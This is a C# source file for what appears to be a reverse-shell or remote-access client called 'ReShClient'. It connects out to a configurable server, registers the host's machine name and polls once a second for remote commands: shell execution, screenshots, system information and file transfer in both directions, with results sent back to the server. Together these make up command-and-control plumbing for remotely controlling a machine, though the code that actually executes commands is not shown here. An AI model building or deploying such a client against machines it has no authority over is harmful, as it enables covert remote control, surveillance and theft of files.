using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReShClient
{
    public class MyLogger
    {
        //[Conditional("DEBUG")]
        public static void LogDebug(string message)
        {
            // Only compiled when DEBUG is defined
            File.AppendAllText("debug.log", $"[{DateTime.Now}] {message}\n");
        }

        // This method will always be compiled
        public static void LogError(string message)
        {
            Console.WriteLine($"[ERROR] {message}");
        }
    }
    public enum RSMessageType
    {
        None,
        CallerLogin, CallerLoginResult, ClientOnline, ClientOffline,
        ClientRegister, ClientRegisterResult,
        GetCommand,
        SendCommand,
        CommandResult
    }
    public class RSMessage
    {
        public RSMessageType Type { get; set; }
        public object Data { get; set; }
        public Guid Id { get; set; }

        public static RSMessage None = new RSMessage();
        public RSMessage()
        {
            Type = RSMessageType.None;
            Data = new object();
            Id = Guid.NewGuid();
        }
        public bool TryGetData<T>(out T data)
        {
            data = default!;
            if (Data is JsonElement element)
            {
                T? result = JsonSerializer.Deserialize<T>(element);
                if (result != null)
                {
                    data = result;
                    return true;
                }
                return false;
            }
            // If Data is already of type T, just cast it
            if (Data is T t)
            {
                data = t;
                return true;
            }
            return false;
        }
    }
    public class ClientRegister
    {
        public string UserName { get; set; }
    }
    public class ClientRegisterResult
    {
        public string UserName { get; set; }
        public bool Status { get; set; }
    }
    public class CallerLogin
    {
        public string UserName { get; set; }
        public string Password { get; set; }
    }
    public class ClientInfo
    {
        public Guid ClientId { get; set; }
        public string Name { get; set; }
    }
    public class CallerLoginResult
    {
        public bool Status { get; set; }
        public List<ClientInfo> OnlineClients { get; set; }
    }
    public class ClientOnline
    {
        public ClientInfo Info { get; set; }
    }
    public class ClientOffline
    {
        public Guid ClientId { get; set; }
    }
    public enum CommandType
    {
        GetInfo,
        ShellCommand,
        Screenshot,
        FileTransfer,
    }
    public class Command
    {
        public Guid ClientId { get; set; }
        public CommandType Type { get; set; }
        public object Data { get; set; }
        public bool TryGetData<T>(out T data)
        {
            data = default!;
            if (Data is JsonElement element)
            {
                T? result = JsonSerializer.Deserialize<T>(element);
                if (result != null)
                {
                    data = result;
                    return true;
                }
                return false;
            }
            // If Data is already of type T, just cast it
            if (Data is T t)
            {
                data = t;
                return true;
            }
            return false;
        }
    }
    public class CommandResult
    {
        public Guid ClientId { get; set; }
        public CommandType Type { get; set; }
        public object Data { get; set; }
        public bool TryGetData<T>(out T data)
        {
            data = default!;
            if (Data is JsonElement element)
            {
                T? result = JsonSerializer.Deserialize<T>(element);
                if (result != null)
                {
                    data = result;
                    return true;
                }
                return false;
            }
            // If Data is already of type T, just cast it
            if (Data is T t)
            {
                data = t;
                return true;
            }
            return false;
        }
    }
    public enum InfoType
    {
        MachineName,
        Ip,
        Mac,
    }
    public class GetInfo
    {
        public InfoType Type { get; set; }
    }
    public class GetInfoResult
    {
        public InfoType Type { get; set; }
        public object InfoDate { get; set; }
    }
    public class Shell
    {
        public string Command { get; set; }
    }
    public class ShellResult
    {
        public string Result { get; set; }
    }
    public class Screenshot
    {

    }
    public class ScreenshotResult
    {
        public bool Status { get; set; }
        public byte[] Screenshot { get; set; }
    }
    public class FileTransfer
    {
        public bool TranferToRemote { get; set; }
        public string FromPath { get; set; }
        public string ToPath { get; set; }
    }
    public class FileTransferResult
    {
        public bool TranferToRemote { get; set; }
        public bool Status { get; set; }
        public byte[] FileData { get; set; }
    }
    public static class RSProtocol
    {
        public static Encoding NCGEncoding = Encoding.UTF8;
        public static RSMessage DecodeMessage(byte[] message)
        {
            //It's said that using utf8 rather than string is more effcient
            return JsonSerializer.Deserialize<RSMessage>(NCGEncoding.GetString(message)) ?? new RSMessage();
        }
        public static byte[] EncodeMessage(RSMessageType Type, object Data)
        {
            RSMessage message = new RSMessage();
            message.Type = Type;
            message.Data = Data;
            return EncodeMessage(message);
        }
        public static byte[] EncodeMessage(RSMessage message)
        {
            string actualMsg = JsonSerializer.Serialize(message, new JsonSerializerOptions { WriteIndented = true });
            byte[] actualBytes = NCGEncoding.GetBytes(actualMsg);
            byte[] headerBytes = BitConverter.GetBytes(actualBytes.Length);
            return headerBytes.Concat(actualBytes).ToArray();
            //return [.. headerBytes, .. actualBytes];
        }
    }
    public class ClientHandler
    {
        public string Name { get; set; }
        public bool IsLoggedIn = false;
        private readonly TcpClient _tcpClient;
        private readonly NetworkStream _stream;
        private readonly RSClient _client;
        public ClientHandler(TcpClient tcpClient, RSClient client)
        {
            Random r = new Random(DateTime.Now.Millisecond);
            Name = "UnknowUser_" + r.NextInt64().ToString();
            _tcpClient = tcpClient;
            _client = client;
            _stream = _tcpClient.GetStream();
        }
        public async Task ReceiveLoopAsync(CancellationToken token)
        {
            try
            {
                while (!token.IsCancellationRequested && _tcpClient.Connected)
                {
                    // Read the 4-byte header to get the message size
                    byte[] lengthBytes = new byte[4];
                    int totalBytesRead = 0;
                    while (totalBytesRead < lengthBytes.Length)
                    {
                        int bytesRead = await _stream.ReadAsync(lengthBytes, totalBytesRead, lengthBytes.Length - totalBytesRead, token);
                        if (bytesRead == 0)
                        {
                            // Connection was closed by the server
                            Disconnect();
                            return;
                        }
                        totalBytesRead += bytesRead;
                    }
                    // Convert the length bytes back to an integer
                    int messageLength = BitConverter.ToInt32(lengthBytes, 0);

                    // Now, read the actual message payload
                    byte[] buffer = new byte[messageLength];
                    int payloadBytesRead = 0;
                    while (payloadBytesRead < messageLength)
                    {
                        int bytesRead = await _stream.ReadAsync(buffer, payloadBytesRead, messageLength - payloadBytesRead, token);
                        if (bytesRead == 0)
                        {
                            // Connection was closed prematurely
                            Disconnect();
                            return;
                        }
                        payloadBytesRead += bytesRead;
                    }
                    RSMessage message = RSProtocol.DecodeMessage(buffer);
                    MyLogger.LogDebug($"[-]Message received:{JsonSerializer.Serialize(message)}");
                    _client.HandleNewMessage(message);
                }
            }
            catch (Exception ex)
            {
                MyLogger.LogDebug($"[*]Error handling message: {ex.Message}");
                Disconnect();
            }
        }
        public async Task SendMessageAsync(byte[] data)
        {
            if (_tcpClient.Connected)
            {
                try
                {
                    // Send data asynchronously
                    await _stream.WriteAsync(data, 0, data.Length);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error sending to server: {ex.Message}");
                    Disconnect();
                }
            }
        }
        public async Task SendMessageAsync(RSMessage message)
        {
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }
        public async Task SendMessageAsync(RSMessageType type, object data)
        {
            RSMessage message = new RSMessage();
            message.Data = data;
            message.Type = type;
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }
        public async Task SendCommandResult(CommandResult command)
        {
            RSMessage message = new RSMessage();
            message.Data = command;
            message.Type = RSMessageType.CommandResult;
            byte[] bytes = RSProtocol.EncodeMessage(message);
            MyLogger.LogDebug($"[-]Message sent:{JsonSerializer.Serialize(message)}");
            await SendMessageAsync(bytes);
        }
        public void Disconnect()
        {
            MyLogger.LogDebug($"[-]Client {Name} disconnected from server.");
            _tcpClient.Close();
            _client.Disconnect();
        }
    }
    public class RSClient
    {
        public event Action<Command> OnCommandReceived;
        public event Action<RSMessage> OnMessageReceived;
        public event Action OnDisconnected;

        private ClientHandler _clientHandler;
        private readonly string _serverIp;
        private readonly int _serverPort;
        private CancellationTokenSource _cts;
        public RSClient(string ipAddress, int port)
        {
            _serverIp = ipAddress;
            _serverPort = port;
        }
        public async Task SendGetCommandLoop(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                await _clientHandler.SendMessageAsync(RSMessageType.GetCommand, null!);
                await Task.Delay(1000, cancellationToken);
            }
        }
        public async Task<bool> ConnectAsync()
        {
            _cts = new CancellationTokenSource();
            TcpClient tcpClient = new TcpClient();
            try
            {
                MyLogger.LogDebug($"[-]Attempting to connect to {_serverIp}:{_serverPort}");
                await tcpClient.ConnectAsync(_serverIp, _serverPort);

                MyLogger.LogDebug("[-]Starting clientHandler.");
                _clientHandler = new ClientHandler(tcpClient, this);

                ClientRegister register = new ClientRegister();
                register.UserName = SystemUtility.GetMachineName();
                await _clientHandler.SendMessageAsync(RSMessageType.ClientRegister, register);
                _ = Task.Run(() => _clientHandler.ReceiveLoopAsync(_cts.Token));

                _ = Task.Run(() => SendGetCommandLoop(_cts.Token));

                return true;
            }
            catch (Exception ex)
            {
                MyLogger.LogDebug($"[*]Connection failed: {ex.Message}\n{ex.StackTrace}");
                return false;
            }
        }
        public void HandleNewMessage(RSMessage message)
        {
            if (message != RSMessage.None)
            {
                switch (message.Type)
                {
                    case RSMessageType.ClientRegisterResult:
                        {
                            ClientRegisterResult response;
                            if (!message.TryGetData(out response))
                                goto default;
                            if (response.Status)
                            {
                                _clientHandler.IsLoggedIn = true;
                                MyLogger.LogDebug($"[-]Client {response.UserName} registered successfully.");
                            }
                            else
                            {
                                MyLogger.LogDebug($"[*]Client {response.UserName} registration failed.");
                            }
                            break;
                        }
                    case RSMessageType.SendCommand:
                        {
                            Command command;
                            if (!message.TryGetData(out command))
                                goto default;
                            OnCommandReceived?.Invoke(command);
                            break;
                        }
                    default:
                        {
                            MyLogger.LogDebug($"[*]Error handling protocol:{JsonSerializer.Serialize(message)}");
                            break;
                        }
                }
            }
            else
            {
                MyLogger.LogDebug($"[*]Error: none message:");
            }
        }
        public async Task SendCommandResult(Guid clientId, CommandType type, object data)
        {
            await _clientHandler.SendCommandResult(new CommandResult { ClientId = clientId, Type = type, Data = data });
        }

        private void ReceiveMessage(RSMessage message)
        {
            OnMessageReceived?.Invoke(message);
        }
        public void Disconnect()
        {
            try
            {
                _cts.Cancel();
                _cts.Dispose();
            }
            catch (Exception ex)
            {
                MyLogger.LogError($"[*]Error during disconnect: {ex.Message}");
            }
            MyLogger.LogDebug("[-]Disconnected from server.");
            OnDisconnected?.Invoke();
        }
    }
}
